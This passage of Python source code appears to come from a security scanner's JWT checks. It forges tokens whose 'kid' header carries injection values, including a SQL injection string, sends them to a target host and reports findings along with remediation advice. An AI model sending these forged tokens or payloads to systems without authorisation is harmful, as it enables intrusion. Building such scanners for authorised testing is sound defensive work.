            ("kid_sqli", "x' OR 1=1--", "medium", "CWE-89"),
        ]
        for label, kid_value, severity, cwe in kid_probes:
            forged = build_kid_mutated_token(parsed, kid_value, secret=cracked_secret)
            response = _send_probe(forged)
            if response.get("skipped"):
                continue
            # For kid probes the signal is a SHAPE CHANGE, not
            # baseline-acceptance: a 500 / different body length
            # signals the kid value reached the resolver.
            response_status = int(response.get("status") or 0)
            response_body_len = len(response.get("body") or "")
            shape_changed = (
                response_status >= 500
                or response_status == 200  # accepted as if signed
                or (
                    baseline_summary["status_class"] == "2xx"
                    and _status_class(response_status) not in ("2xx", "4xx")
                )
            )
            active_probes.append({
                "label": label,
                "class_": "kid",
                "status": response_status,
                "body_length": response_body_len,
                "accepted": shape_changed,
                "finding_severity": severity if shape_changed else None,
            })
            if shape_changed:
                key = f"{severity}::{label}"
                if key not in seen_dedup_keys:
                    seen_dedup_keys.add(key)
                    _emit_finding(
                        title=f"JWT kid mutation reached resolver on {target_host} ({label})",
                        severity=severity,
                        cwe=cwe,
                        target=target_host,
                        endpoint=test_endpoint_url,
                        description=(
                            f"Forged token with `kid` = {kid_value!r}; "
                            f"server returned shape-changed response "
                            f"(status {response_status}). Suggests "
                            f"the kid value reached a file-system / "
                            f"DB resolver instead of an allow-list "
                            f"check."
                        ),
                        description_plain=(
                            "Your JWT validator passes the `kid` "
                            "header into a file system or database "
                            "lookup. An attacker who can craft a "
                            "token can inject path-traversal or SQL "
                            "into the lookup."
                        ),
                        recommended_action=(
                            "Validate `kid` against an allow-list of "
                            "known key IDs. Treat the kid header as "
                            "untrusted input — never use it directly "
                            "in a file path or SQL query."
                        ),
                    )
                    findings_emitted += 1

    _complete_check(
        cev,
        result="vulnerable" if findings_emitted else "not_vulnerable",
        evidence=f"{findings_emitted} JWT finding(s) on {target_host}",
    )

    return _build_result(
        token=token, parsed=parsed,
        target_host=target_host,
        static_findings=static_findings,
        active_probes=active_probes,
        cracked_secret=cracked_secret,
        findings_emitted=findings_emitted,
    )


def _build_result(
    *,
    token: str,
    parsed: dict[str, Any],
    target_host: str,
    static_findings: list[dict[str, Any]],
    active_probes: list[dict[str, Any]],
    cracked_secret: str | None,
    findings_emitted: int,
    inconclusive: bool = False,
    reason: str = "",
) -> dict[str, Any]:
    out: dict[str, Any] = {
        "success": True,
        "token": token,
        "header": parsed["header"],
        "payload": parsed["payload"],
        "target_host": target_host,
        "static_findings": static_findings,
        "active_probes": active_probes,
        "findings_emitted": findings_emitted,
    }
    if cracked_secret is not None:
        out["cracked_secret"] = cracked_secret
    if inconclusive:
        out["inconclusive"] = True
        out["reason"] = reason
    return out


def _normalize_target(target: str) -> str | None:
    if not target or not isinstance(target, str):
        return None
    target = target.strip()
    if not target:
        return None
    if "://" not in target:
        target = f"https://{target}"
    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https"):
        return None
    if not parsed.netloc:
        return None
    return target
